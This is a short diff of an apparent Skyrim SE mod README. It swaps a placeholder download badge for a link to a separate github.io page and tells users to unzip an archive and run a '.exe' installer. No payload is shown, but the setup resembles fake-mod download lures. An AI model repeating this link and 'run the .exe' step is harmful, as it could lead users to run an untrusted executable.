@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install all terrain and shadow patches automatically into your Skyrim SE directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://terrain-shadows-mod-patches-skyrim-se.github.io/.github/)
 
 ## 📸 Overview
 ![skyrim-terrain-shadows-lighting](https://github.com/user-attachments/assets/0496aae1-8ed0-44ec-b107-5dcc02594fe6)
